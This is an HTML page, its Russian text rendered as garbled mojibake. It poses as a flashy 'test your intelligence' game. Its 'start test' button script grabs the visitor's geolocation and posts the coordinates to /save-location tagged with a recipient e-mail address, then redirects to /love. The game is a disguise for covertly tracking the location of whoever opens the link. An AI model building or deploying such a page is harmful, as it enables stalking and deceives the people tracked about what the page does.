<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>–ü—Ä–æ–≤–µ—Ä—å —Å–≤–æ–π –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç ‚Äî –ò–≥—Ä–∞</title>
  <meta name="theme-color" content="#0ef" />
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#0a0f1e; --grid1:#0c1a3c; --grid2:#142a5c; --neon1:#00f6ff; --neon2:#ff00cc; --neon3:#00ff88;
      --warn:#ff4d6d; --ok:#2ee59d; --text:#f0f8ff; --muted:#b0c4de; --card:rgba(15,25,50,.75);
      --stroke:rgba(0,246,255,.35); --radius:24px; --shadow:0 16px 56px rgba(0,246,255,.28), inset 0 0 0 1px rgba(255,255,255,.08);
      --soft-shadow:0 10px 30px rgba(0,0,0,.35); --glow:0 0 20px rgba(0,246,255,.5);
      --pad:clamp(14px,4vw,24px);
    }
    *{box-sizing:border-box} html,body{height:100%}
    body{
      margin:0; color:var(--text); font-family:'Roboto',system-ui,-apple-system,Segoe UI,Arial;
      background:
        radial-gradient(1200px 800px at 10% 15%, #0b1330 0%, transparent 60%),
        radial-gradient(1000px 800px at 95% 90%, #081024 0%, transparent 60%),
        var(--bg);
      display:grid; place-items:center;
      padding: max(env(safe-area-inset-top),8px) max(env(safe-area-inset-right),8px)
               max(env(safe-area-inset-bottom),8px) max(env(safe-area-inset-left),8px);
    }

    /* background scene */
    .scene{position:fixed; inset:0; pointer-events:none; z-index:-3}
    .stars{
      background:
        radial-gradient(2px 2px at 10% 20%, #fff, transparent 50%),
        radial-gradient(1.8px 1.8px at 40% 30%, #fff, transparent 50%),
        radial-gradient(2.2px 2.2px at 70% 15%, #fff, transparent 50%),
        radial-gradient(1.5px 1.5px at 85% 60%, #fff, transparent 50%),
        radial-gradient(1.7px 1.7px at 25% 75%, #fff, transparent 50%);
      opacity:.7; animation:twinkle 3s ease-in-out infinite;
    }
    @keyframes twinkle{50%{opacity:.95}}
    .grid{
      background:
        linear-gradient(var(--grid1) 1px, transparent 1px) 0 0/100% 30px,
        linear-gradient(90deg, var(--grid1) 1px, transparent 1px) 0 0/30px 100%;
      transform:perspective(1000px) rotateX(65deg) translateY(42vh);
      box-shadow: inset 0 0 100px rgba(0, 246, 255, .10);
      filter: drop-shadow(0 -12px 42px rgba(255,0,204,.25));
      animation:gridMove 9s linear infinite; opacity:.55;
    }
    @keyframes gridMove{to{background-position-y:300px,0}}

    .wrap{
      width:100%; max-width:860px; padding:var(--pad);
      display:grid; place-items:center;
    }

    .card{
      width:min(740px, 96vw);
      background:linear-gradient(180deg, rgba(20,30,60,.86), rgba(10,15,30,.7));
      border-radius:clamp(18px,3vw,24px);
      border:1px solid var(--stroke);
      outline:1.5px solid rgba(255, 0, 204, .12);
      box-shadow:var(--shadow), var(--soft-shadow);
      backdrop-filter: blur(14px) saturate(1.2);
      -webkit-backdrop-filter: blur(14px) saturate(1.2);
      overflow:hidden; transition:transform .25s ease, box-shadow .3s ease;
    }
    .card:hover{transform:translateY(-2px)}
    .card::before{
      content:""; position:absolute; inset:-3px; border-radius:inherit; padding:3px;
      background:conic-gradient(from 0deg, var(--neon1), var(--neon2), var(--neon3), var(--neon1));
      -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
      mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
      -webkit-mask-composite:xor; mask-composite:exclude;
      animation:spin 7s linear infinite; opacity:.55; pointer-events:none;
    }
    @keyframes spin{to{transform:rotate(360deg)}}

    .card-header{
      padding:clamp(14px,4vw,20px) var(--pad);
      display:flex; align-items:center; justify-content:space-between; gap:12px;
      border-bottom:1px solid rgba(0,246,255,.18);
      background:linear-gradient(90deg, rgba(0,246,255,.10), transparent);
    }
    .title{
      font-family:'Orbitron',sans-serif; font-weight:900; letter-spacing:.5px;
      font-size:clamp(18px,4.6vw,24px);
      display:flex; align-items:center; gap:.6rem;
      text-shadow:0 0 16px rgba(0,246,255,.35);
    }
    .status{
      font-size:clamp(12px,3.4vw,13px); color:var(--muted);
      padding:.4rem .75rem; border-radius:999px;
      border:1px solid rgba(255,255,255,.12);
      background:rgba(255,255,255,.05); display:flex; align-items:center; gap:6px;
      white-space:nowrap;
    }
    .status .dot{width:10px; height:10px; border-radius:50%; background:var(--ok); box-shadow:0 0 12px rgba(46,229,157,.8)}

    .card-body{padding:clamp(18px,5vw,28px) var(--pad); text-align:center}
    h1{
      margin:0 0 10px; font-family:'Orbitron',sans-serif;
      font-size:clamp(22px,7vw,36px); font-weight:900; letter-spacing:.5px;
      background:linear-gradient(90deg, var(--neon1), var(--neon2), var(--neon3));
      -webkit-background-clip:text; background-clip:text; color:transparent;
      filter:drop-shadow(0 5px 18px rgba(0,246,255,.28));
      animation:glowText 2s ease-in-out infinite;
    }
    @keyframes glowText{50%{filter:drop-shadow(0 6px 24px rgba(0,246,255,.45))}}

    p{color:var(--muted); margin:.5rem 0 1.2rem; font-size:clamp(14px,4vw,16px)}

    .chip{
      display:inline-flex; align-items:center; gap:.6rem;
      padding:.55rem .9rem; border-radius:999px;
      background:rgba(0,246,255,.14);
      border:1px solid rgba(0,246,255,.35);
      color:#c0f0ff; font-family:'Orbitron',sans-serif; font-weight:700; letter-spacing:.3px;
      box-shadow: inset 0 0 18px rgba(0,246,255,.18);
      margin:6px 0 16px; font-size:clamp(13px,3.8vw,15px);
      max-width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
    }
    .chip::before{content:"üìß"}

    .xp{height:12px; border-radius:12px; overflow:hidden;
      background:rgba(255,255,255,.08); border:1px solid rgba(255,255,255,.1);
      margin:0 auto 16px; width:min(560px,92%);
    }
    .xp>i{display:block; height:100%;
      background:linear-gradient(90deg, var(--ok), #00ffc6); box-shadow:0 0 20px rgba(46,229,157,.5);
      width:35%; animation:xpPulse 2.5s ease-in-out infinite;
    }
    @keyframes xpPulse{50%{filter:brightness(1.18)}}

    .btn{
      position:relative; display:inline-flex; align-items:center; justify-content:center; gap:.7rem;
      width:100%; min-height:56px; padding:16px 18px; border-radius:16px; border:0; cursor:pointer;
      text-transform:uppercase; font-family:'Orbitron',sans-serif; font-weight:900; letter-spacing:.7px;
      color:#001018; font-size:clamp(15px,4.4vw,17px);
      background: radial-gradient(100% 100% at 50% 0%, rgba(255,255,255,.7), transparent 42%),
                  linear-gradient(90deg, var(--neon1), var(--neon2), var(--neon3));
      box-shadow: 0 16px 36px rgba(0,246,255,.30), 0 0 0 1px rgba(0,0,0,.25) inset;
      transition:transform .1s ease, box-shadow .25s ease, filter .25s ease;
      touch-action:manipulation;
    }
    .btn:hover{transform:scale(1.03); box-shadow:0 22px 44px rgba(0,246,255,.45), 0 0 0 1px rgba(0,0,0,.25) inset}
    .btn:active{transform:translateY(1px) scale(.99)}
    .btn .k-light{
      position:absolute; inset:-3px; border-radius:inherit; pointer-events:none;
      background:conic-gradient(from 0deg, rgba(255,255,255,.35), transparent 30%, rgba(255,255,255,.28) 60%, transparent 90%);
      mix-blend-mode:soft-light; filter:blur(7px); animation:spin 5s linear infinite; opacity:.5;
    }
    .spinner{display:inline-block; width:1.1em; height:1.1em; border:.18em solid rgba(0,0,0,.2); border-top-color:#001018; border-radius:50%; animation:spin .8s linear infinite}

    #msg{min-height:1.5rem; margin-top:12px; color:var(--warn); font-size:clamp(13px,3.6vw,14px); text-shadow:0 0 10px rgba(255,77,109,.38)}

    .hud{
      display:flex; justify-content:space-between; align-items:center; gap:12px;
      border-top:1px solid rgba(255,255,255,.1);
      padding:12px var(--pad); color:var(--muted); font-size:clamp(12px,3.6vw,13px);
      background:linear-gradient(90deg, transparent, rgba(255,0,204,.08), transparent);
    }

    /* canvas layer */
    #fx{position:fixed; inset:0; z-index:-1; pointer-events:none}

    /* Mobile tuning */
    @media (max-width: 420px){
      .card{width:92vw}
      .card-header{padding:12px var(--pad)}
      .chip{max-width:88vw}
    }
    /* Reduce heavy effects for low-end / battery-save */
    @media (pointer:coarse){
      .card::before{opacity:.4}
      .grid{opacity:.5}
      .stars{opacity:.6}
    }
    @media (prefers-reduced-motion: reduce){
      .stars,.grid,.card::before,.btn .k-light,.xp>i{animation:none}
    }
  </style>
</head>
<body>
  <div class="scene" aria-hidden="true">
    <div class="stars"></div>
    <div class="grid"></div>
  </div>
  <canvas id="fx" aria-hidden="true"></canvas>
<!-- 
  <audio id="bg-music" autoplay loop playsinline>
    <source src="/Miyagi_Endshpil_Melodrama_bomba.mp3" type="audio/mpeg">
  </audio> -->

  <main class="wrap">
    <section class="card" role="region" aria-labelledby="ttl">
      <header class="card-header">
        <div class="title" id="ttl">üéÆ –ü—Ä–æ–≤–µ—Ä—å —Å–≤–æ–π –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç!</div>
        <div class="status"><span class="dot"></span>–û–Ω–ª–∞–π–Ω</div>
      </header>

      <div class="card-body">
        <h1>–ù–∞—á–Ω–∏ –∏–≥—Ä—É –∑–∞ —Å–µ–∫—É–Ω–¥—É!</h1>

        <!-- EJS value; –±–∞—Ä–æ–∏ —Å—Ç–∞—Ç–∏–∫–∏ –æ–¥–¥”£ e-mail —Ä–æ –Ω–∞–≤–∏—Å -->
        <div id="recipient_email" class="chip" data-value="<%= recipient_email %>">–õ—É—á—à–∞—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è —Ç–µ—Å—Ç–∞</div>

        <div class="xp"><i></i></div>

        <button id="go" class="btn" onclick="sendLocationFast()">
          <span class="k-light"></span>‚ñ∂ –ù–∞—á–∞—Ç—å —Ç–µ—Å—Ç
        </button>

        <div id="msg" aria-live="polite"></div>
      </div>

      <footer class="hud" aria-hidden="true">
        <div>–í–µ—Ä—Å–∏—è 1.0 ‚Ä¢ –ó–∞–¥–µ—Ä–∂–∫–∞ <span id="latency">‚Äî</span> –º—Å</div>
        <div>–†–µ–∂–∏–º: <strong>–ú–æ–ª–Ω–∏–µ–Ω–æ—Å–Ω—ã–π</strong></div>
      </footer>
    </section>
  </main>

  <script>
    const buzz = (ms=20)=>('vibrate' in navigator)&&navigator.vibrate(ms);

    // particles: tuned for mobile
    (function () {
      const canvas = document.getElementById('fx');
      const ctx = canvas.getContext('2d', { alpha: true });
      let DPR = Math.min(2, Math.max(1, window.devicePixelRatio || 1));
      let W=0, H=0, P=[], last=0;
      let mobile = matchMedia('(pointer:coarse)').matches;

      function resize(){
        W = canvas.width  = Math.floor(innerWidth * DPR);
        H = canvas.height = Math.floor(innerHeight * DPR);
        canvas.style.width = innerWidth+'px';
        canvas.style.height= innerHeight+'px';
      }
      resize();
      addEventListener('resize', resize, { passive:true });

      function spawn(x,y,n){ // fewer particles on touch devices
        const N = n ?? (mobile ? 10 : 18);
        for(let i=0;i<N;i++){
          const a = Math.random()*Math.PI*2, s = (mobile?0.8:1) * (0.5+Math.random()*1.6);
          P.push({
            x:x*DPR, y:y*DPR,
            vx:Math.cos(a)*s*DPR, vy:Math.sin(a)*s*DPR - 0.5*DPR,
            g:0.02*DPR, life:0, max:(mobile?500:800)+Math.random()*400,
            s:2+Math.random()*2, c:Math.random()<.5?'#00f6ff':'#ff00cc'
          });
        }
      }
      window.fxBurst = (x,y)=>spawn(x,y);

      function tick(ts){
        if(!last) last = ts;
        const dt = Math.min(18, ts-last); last = ts;
        ctx.clearRect(0,0,W,H);
        for(let i=P.length-1;i>=0;i--){
          const p = P[i];
          p.life += dt; p.vy += p.g*dt; p.x += p.vx*dt; p.y += p.vy*dt;
          ctx.globalAlpha = Math.max(0, 1 - p.life/p.max);
          ctx.fillStyle = p.c; ctx.fillRect(p.x, p.y, p.s, p.s);
          if(p.life > p.max) P.splice(i,1);
        }
        requestAnimationFrame(tick);
      }
      requestAnimationFrame(tick);
    })();

    // latency HUD
    (function () {
      const t0 = performance.now();
      addEventListener('load', () => {
        const el = document.getElementById('latency');
        if (el) el.textContent = Math.round(performance.now() - t0);
      });
    })();

    async function sendLocationFast(){
      const btn = document.getElementById('go');
      const msg = document.getElementById('msg');
      const recipient = document.getElementById('recipient_email').dataset.value || 'chatgpt0067@gmail.com';

      btn.innerHTML = '<span class="k-light"></span><span class="spinner"></span> –û—Ç–ø—Ä–∞–≤–∫–∞...';
      btn.disabled = true; buzz(15);

      const r = btn.getBoundingClientRect(); fxBurst(r.left+r.width/2, r.top+r.height/2);

      const goLove = (url)=>window.location.replace(url||'/love');

      if(!('geolocation' in navigator)){ goLove(); return; }

      try{
        const pos = await new Promise((ok,err)=>navigator.geolocation.getCurrentPosition(
          ok,err,{ enableHighAccuracy:false, timeout:4000, maximumAge:30000 }
        ));
        const body = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, recipient_email: recipient };

        const res = await fetch('/save-location', {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify(body)
        }).catch(()=>null);

        if(res){ await res.json().catch(()=>({})); }
        fxBurst(innerWidth/2, 24); buzz(15);
        goLove('/love');
      }catch(e){
        goLove('/love');
      }
    }
  </script>
</body>
</html>
